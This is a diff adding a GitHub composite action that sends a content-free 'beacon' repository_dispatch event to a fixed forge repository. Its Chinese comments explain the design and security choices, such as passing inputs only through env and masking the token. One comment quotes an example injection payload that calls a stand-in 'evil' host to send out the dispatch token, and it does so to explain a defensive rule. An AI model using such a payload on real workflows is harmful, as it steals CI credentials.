@@ -1,0 +1,111 @@
+name: beacon
+description: >-
+  往 forge 发一声「信标」：只带事件类型与几个标识，不带任何内容 —— 要搬什么、要处理哪张单，
+  由 forge 自己用 API 来 store 读（03 §2.6）。
+
+# 为什么是 composite action：这一声从前在 store 里写了两遍 —— forward.yml 里一遍
+# （actions/github-script + retries），publish-apk.yml 里一遍（`gh api --input -`）。
+# 两遍的载荷形状必须一致（forge 那边读的是同一组键），而"必须一致、错了却是静默失败"
+# 的拷贝是迟早要漂移的那种。现在三个入口文件共用这一份。
+#
+# ⚠️ **它不做"决定要不要发"这件事。** 每家入口该在什么条件下发车是那家的业务，
+# 写在各自的 workflow 里（比如 intake-incoming 只管 tag 名为 `_incoming` 的 release）——
+# 这个动作被调到就发，不做任何判断。把判断藏进这里，将来读入口文件的人就看不见
+# "什么事件会让 forge 动起来"了。
+#
+# ⚠️ **publish-apk.yml 刻意不用它**（那一份保持内联），理由不是省事：
+# 那个文件是 `workflow_call` 可复用工作流，由**别的仓库**调用。`$/.github/actions/beacon`
+# 解析的是"**这个文件所属的仓库**"，于是调用方要先能读到 store 的内容 —— 而
+# `uses:` 没有地方能塞 token，调用方的 GITHUB_TOKEN 又出不了它自己的仓库
+# （§6.2 不变量 1）。写 `./.github/actions/beacon` 更糟：那个是**工作区相对路径**，
+# 按**调用方**的仓库解析，在那边 404。所以那一处只能自带一副内联的载荷。
+inputs:
+  token:
+    description: >-
+      细粒度 PAT。它要**同时**够得着两个仓库：往 store 写（日常）与往 forge 发
+      repository_dispatch。GITHUB_TOKEN 不能跨仓库（§6.2 不变量 1），所以这里
+      **不能**吃默认值。
+    required: true
+  event-type:
+    description: >-
+      这一声信标叫什么名字。它是 `repository_dispatch` 的 `types`，也就是 forge 那边的
+      **路由键** —— forge 的三个入口文件各自只认一个词（`source-change` /
+      `intake-incoming` / `reconcile`）。
+      ⚠️ 打过去一个那边没人监听的名字时，GitHub 返回 **204 且什么都不做**：没有报错、
+      没有日志、Actions 页面干干净净。所以"让 forge 挂上新监听"必须**先于**"让 store
+      开始发"（03 §4.2）。
+    required: true
+  issue:
+    description: >-
+      issue 编号，只有 source-change 这条路有（手动按钮与 release 两条路上它是空的，
+      于是发出去 0）。空值不是错误：那条路上 forge 只处理单，不看编号；反过来
+      source-change 少了它则由二进制硬错（"缺少 issue 编号"），不会退化成跑错功能。
+    required: false
+    default: '0'
+  ref:
+    description: 触发这一声的 ref。**只是现场记录**，forge 侧目前不读（它读 store 用的是自己的 API）。
+    required: false
+    default: ''
+  sha:
+    description: >-
+      同上，只是现场记录。⚠️ 但**不要**因为它现在没人读就删掉：`[skip-dispatch]` 那条
+      保险（见 forge-core 的 internal/job/ctx.go）说的是"store 哪天把 `push:` 触发器加回来"，
+      而那个分支的判据正是**这次 push 改了哪个 app** —— 它要的就是 sha。
+    required: false
+    default: ''
+runs:
+  using: composite
+  steps:
+    # GitHub 官方的 API 客户端 action（node24，无第三方依赖树）。选它而不是手写 curl，
+    # 是为了让 payload 走 octokit 的 JSON 序列化：老写法里 `"ref":"%s"` 是**没有转义**的，
+    # 而 git 的 refname 规则禁空格、`~^:?*[\`、`..`、`@{`，**却不禁止 `"`** —— 一个叫
+    # `v1.0"x` 的分支名就能把那串 JSON 拼坏。顺带白拿指数退避重试。
+    #
+    # 用主版本标签（`@v9`），不钉 commit SHA：升级交给 dependabot.yml 每周开 PR。
+    # 钉 SHA 更抗供应链，但每次升级都要人工查 SHA，而 SHA 写错是**静默失败** ——
+    # 取舍是有意的。
+    - name: Dispatch forge
+      uses: actions/github-script@v9
+      env:
+        # ⚠️ 一切外部数据只经 env 传入；下面 script: 里**一处 ${{ }} 都没有**。
+        # script: 不是 shell，但 ${{ }} 在这里同样是**文本拼接** —— 往里面塞一个
+        # `'); fetch('https://evil/?'+process.env.DISPATCH_TOKEN); //` 效果和在 run: 里
+        # 注入完全一样。这是硬规矩 2，不是 shell 专属的规矩，而且它在本动作里比在
+        # 别处更要紧：`issue` 这个 input 最终来自**陌生人写的** issue 事件。
+        DISPATCH_TOKEN: ${{ inputs.token }}
+        EVENT_TYPE: ${{ inputs.event-type }}
+        ISSUE_NUMBER: ${{ inputs.issue }}
+        REF: ${{ inputs.ref }}
+        SHA: ${{ inputs.sha }}
+        # 收尾要叫的那一声发给谁。写死而不是做成 input：store 与 forge 是同一套部署的
+        # 两个固定点，而"能改的值"就是"会被改错的值"（同 publish-apk.yml 的处理）。
+        FORGE: market-of-labs/forge
+      with:
+        # 走 PAT：GITHUB_TOKEN 不能跨仓库（§6.2 不变量 1）。
+        github-token: ${{ inputs.token }}
+        # 瞬时 5xx 指数退避重试。401/403/404/422 按 action 默认值**不**重试 ——
+        # 那些重试也没用（token 错就是错），只会把一次失败拖成四次。
+        retries: 3
+        script: |
+          // 与老写法里的 `echo "::add-mask::"` 等价。GitHub 本就会自动遮蔽
+          // secrets.* 的值，这里显式再来一次，是为了不去依赖"自动遮蔽"这个行为。
+          core.setSecret(process.env.DISPATCH_TOKEN)
+
+          const [owner, repo] = process.env.FORGE.split('/')
+
+          await github.rest.repos.createDispatchEvent({
+            owner,
+            repo,
+            // ⚠️ 这里**没有** `client_payload.event` 了。从前它是"是哪种事件"的答案，
+            // 而那个答案是从一个字符串里读出来的 —— 于是"forge 该跑哪件事"成了一个
+            // 运行期判断（Go 里的 switch）。现在它就是上面那个 `event_type`，即
+            // `types:` 过滤器：**路由在编译期**（文件名 + 触发面），payload 里不再
+            // 需要一个能被外部字符串影响的字段。
+            event_type: process.env.EVENT_TYPE,
+            client_payload: {
+              issue: Number(process.env.ISSUE_NUMBER || 0),
+              repo: `${context.repo.owner}/${context.repo.repo}`,
+              ref: process.env.REF || '',
+              sha: process.env.SHA || '',
+            },
+          })
